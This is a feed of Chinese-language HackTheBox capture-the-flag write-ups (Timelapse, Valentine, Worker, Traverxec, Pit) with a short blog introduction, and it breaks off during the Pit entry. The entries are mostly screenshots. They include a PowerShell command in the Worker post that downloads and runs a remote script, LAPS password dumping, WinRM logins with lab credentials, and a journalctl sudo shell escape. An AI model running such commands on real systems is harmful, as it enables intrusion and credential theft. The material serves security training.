<p><code>https://www.sentinelone.com/blog/laps-vulnerability-assessment/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.qcma2lg404w.webp"
                     
                ></p>
<p>LAPS存储有明文密码</p>
<p>尝试对其进行获取</p>
<p><code>https://github.com/n00py/LAPSDumper/blob/main/laps.py</code></p>
<p><code>python laps.py -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -d timelapse.htb</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.1zi5stlemlfk.webp"
                     
                ></p>
<p>尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.6b4kdl4edcs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.7j6bu5qqlgc0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine - HackTheBox</title>
    <url>/post/648c6772aa21/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.7kt0hbxa2ls0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.3ph992jgbgo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.3uar0qsleg40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.4rm1imc6lfg0.webp"
                     
                ></p>
<p>看看80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.1vv7cdx8kqqo.webp"
                     
                ></p>
<p>就一张图片，443端口同样也是图片，扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.75tx855d6t00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.77fbse6b1ug0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.3akf97fqp4o.webp"
                     
                ></p>
<p>发现一个key文件，下载下来看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.25w689fbfj4w.webp"
                     
                ></p>
<p>内容为二进制，复制出来修改一下</p>
<p>将空格全部替换为\x</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.1gqll2p6gpgg.webp"
                     
                ></p>
<p>利用python脚本进行解码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.4qepui8r8l20.webp"
                     
                ></p>
<p>是个密钥，保存一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.6ru2z3o3g200.webp"
                     
                ></p>
<p>尝试一下链接，由于原本的key文件是hype_key，猜测用户名为hype</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.5bu6lrci6t40.webp"
                     
                ></p>
<p>爆破失败</p>
<p>看着80端口的图片，感觉像是一个Linux的漏洞，心脏滴血</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.26tgc7zmfa8w.webp"
                     
                ></p>
<p>尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.4ryjp0a86kg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.5cvei3dhhh00.webp"
                     
                ></p>
<p>切换python版本运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.2iztd1n63ce0.webp"
                     
                ></p>
<p>发现右下角有一个$test，内容非常类似于base64编码，尝试解码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.4o191lai7j80.webp"
                     
                ></p>
<p>这玩应该就是密钥的密码了</p>
<p>再次尝试连接</p>
<p>如果在链接时，爆出<code>sign_and_send_pubkey: no mutual signature supported</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.5tyeq3942y00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.405nryy5ezw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.3myyrap2qbm0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.2obtj9z30s20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.vqsfpieycls.webp"
                     
                ></p>
<p>版本符合</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.71tdlm8zl300.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.6cwgw1xxowc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Valentine/image.7kue3v1bf200.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Worker - HackTheBox</title>
    <url>/post/df6e5024804a/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.33uzwrtxxoo0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.y92xhdhtyps.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.34z9ozw59mw0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.5507xlsfygw0.webp"
                     
                ></p>
<p>iis起始页，3690端口svnserve服务没见过，搜一下</p>
<p><code>https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.2sq5f40izqc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.7cybmw0tlws0.webp"
                     
                ></p>
<p>目录下有东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.3bz1i3q7fso0.webp"
                     
                ></p>
<p>获得了一个域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.6j1bntpliro0.webp"
                     
                ></p>
<p>又一个域名，添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.432fcbhm1900.webp"
                     
                ></p>
<p>要登录</p>
<p>另一个域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.1s8u5lwsjpxc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.5i5xi6ockts0.webp"
                     
                ></p>
<p>这里又获得一大堆域名，都添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.734fyvycx0w0.webp"
                     
                ></p>
<p>这些页面都没什么利用信息，继续看3690端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.6u7ueug77f00.webp"
                     
                ></p>
<p>这里还有一关ps1文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4f8sd555pco0.webp"
                     
                ></p>
<p>获得了账号密码，去登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4tu6wmqfbz00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.73r391d8ojs0.webp"
                     
                ></p>
<p>这里貌似可以上传webshell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4cl6ggq2h880.webp"
                     
                ></p>
<p>并没有权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.1va4rzij1tc0.webp"
                     
                ></p>
<p>直接新建一个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.2y829wjge240.webp"
                     
                ></p>
<p>上是上传了，但路径是哪里</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.18o893qt09pc.webp"
                     
                ></p>
<p>然后我发现了这里，这个地方应该就是对应着那些子域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.jlbbdb0uh7c.webp"
                     
                ></p>
<p>去访问看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.5el515mo6m80.webp"
                     
                ></p>
<p>貌似不行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4m98zij8j6w0.webp"
                     
                ></p>
<p>要发布后，才访问成功</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.72uw4s3tl880.webp"
                     
                ></p>
<p>获取webshell</p>
<p><code>powershell -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/test.ps1&#39;)&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.15m8tgl1v8g0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.6nvep5l1gyw0.webp"
                     
                ></p>
<p>windows server 2019 64位系统</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.65ygvwzhcug0.webp"
                     
                ></p>
<p>检测工具也是什么也没检测到</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4679kmt5mko0.webp"
                     
                ></p>
<p>尝试<code>PrintSpoofer</code>提权</p>
<p>msf生成一个反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.4944ol9mryq0.webp"
                     
                ></p>
<p>但是并没有什么用</p>
<p>在users目录下发现<code>robisl</code>和<code>restorer</code>两个用户，并且都可以进行远程登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.77mt6pdhr8s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.5d7eyfnnbxs0.webp"
                     
                ></p>
<p>开放了445，但并没有扫描到</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.u6yl7hnbf4w.webp"
                     
                ></p>
<p>还有一个W:磁盘</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.2dljnssgwrok.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.awe8uus5b80.webp"
                     
                ></p>
<p>发现一个passwd文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.2jotptjyjvi0.webp"
                     
                ></p>
<p>这应该是明文账号密码了</p>
<p>尝试登录</p>
<p><code>evil-winrm -i 10.10.10.203 -u robisl -p wolves11</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.6pnpe265vp80.webp"
                     
                ></p>
<p>但是这样还是提不了权</p>
<p>继续返回80，尝试用robisl用户登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.3sem32p7uio0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.2k7mr7fvtii0.webp"
                     
                ></p>
<p>貌似这个用户可以用administrator的权限执行一些管道命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.28tq5hgikhhc.webp"
                     
                ></p>
<p>修改script部分和pool内容，让其反弹一个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.45pqm63jvsi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Worker/image.okiodvqsteo.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Traverxec - HackTheBox</title>
    <url>/post/319bc2df6b64/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.1y6zvxyi2xy8.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.5l2p2j6lt8c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.1p9em4evpzk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.7bcbszd2swo0.webp"
                     
                ></p>
<p>发现80端口开放了一个nostromo 1.9.6，搜一下有无可利用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.10dhmc5ah8c0.webp"
                     
                ></p>
<p>有个rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.4q2sxrx7pd60.webp"
                     
                ></p>
<p>好像不是python3，找一下有没有python3版本的</p>
<p><code>https://github.com/AnubisSec/CVE-2019-16278/blob/master/nostroSploit.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.6nlgolz4s0g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.e5kfzdd4goo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.1ar5rtguiqo0.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.44jp0z5xvni0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.62c3p4xtwrk0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.5mgbln7wvow0.webp"
                     
                ></p>
<p>发现一个疑似david用户的密钥</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.39l2z52v9q00.webp"
                     
                ></p>
<p>爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.3o7yorpw0h00.webp"
                     
                ></p>
<p>爆不出来</p>
<p>在conf目录下发现nhttpd.conf，貌似是个配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.6yydu8lbypo0.webp"
                     
                ></p>
<p>最下方有一个路径，指向&#x2F;home&#x2F;david&#x2F;public_www</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.6nac4r54iws0.webp"
                     
                ></p>
<p>发现一个压缩包文件，把他传到本地</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.6ocn0sgzpas0.webp"
                     
                ></p>
<p>解压</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.1fmpzae1kneo.webp"
                     
                ></p>
<p>解压出一个home文件夹</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.7b6bkt8cjz00.webp"
                     
                ></p>
<p>发现密钥文件，尝试连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.6bnyomm3ti40.webp"
                     
                ></p>
<p>爆破一下密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.2h5g8ce6xqm0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.52u1fs4qly80.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.4kgr7e26fau0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.3az052xbrg80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.afnn9meqkjk.webp"
                     
                ></p>
<p>貌似可以用sudo执行journalctl</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.4l8f9m8mdme0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.72iol7yfcio0.webp"
                     
                ></p>
<p>直接使用好像不行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.4ts0x845hea0.webp"
                     
                ></p>
<p>将显示范围缩小，让输出信息无法全部输出的时候，在输入!&#x2F;bin&#x2F;bash</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.2ppcis2vgzm0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Traverxec/image.11yegjhnbwy8.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/6fefadf19e23/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.webp"
                     
                ></p>
<p>很久没有见过这个标题了，之前也或多或少尝试过几次搭建blog，但是都没有坚持到现在，<del>主要是因为懒</del></p>
<p>前几次都是用的腾讯云、阿里云等云平台购买的服务器进行搭建，后面由于忘记续费，<del>没钱</del>，所导致以前的数据也都不存在了，这次又一时兴起，想整一个blog出来，想到购买合适的服务器，以及购买域名，和日常维护等等等等一堆乱七八糟的事情</p>
<p>所以就考虑搭建一个静态的，维护起来也省事，这次所选用的是Hexo+Keep+GitHub的组合，省去了购买服务器与域名的钱，以及无需操心遭受攻击，<del>除非能把Github打穿</del></p>
]]></content>
  </entry>
  <entry>
    <title>Pit - HackTheBox</title>
    <url>/post/4c2881b8730b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.24279zxabg74.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5jahx8ja1qo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5fnxn8mp3qs0.webp"
                     
                ></p>
<p>先看看80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3abdeu5cqa20.webp"
                     
                ></p>
<p>9090端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3s4dfpa8jhc0.webp"
                     
                ></p>
<p>发现一个域名，之前nmap扫描也有一个域名，添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.1cnvz57b334w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.7jfz7vijwcc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.7fiokgitx4c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.23xh4qyvkc5c.webp"
                     
                ></p>
<p>没什么不同，扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.cuzsrdcxoio.webp"
                     
                ></p>
<p>扫了一堆403出来</p>
<p>看看udp端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5wg3y7hguq40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.513b6xxmc6o.webp"
                     
                ></p>
<p><code>snmpwalk -v 2c -c public 10.10.10.241 .</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5pzc9perkt00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3eqvtzep4vo0.webp"
                     
                ></p>
<p>扫描出了一个网站目录和两个用户名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.33447f4t71s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.1ed8brox9g1s.webp"
                     
                ></p>
<p>跳转到了一个登录框</p>
<p>尝试用扫描出的用户名登录<code>michelle:michelle</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6t0iqqccko40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
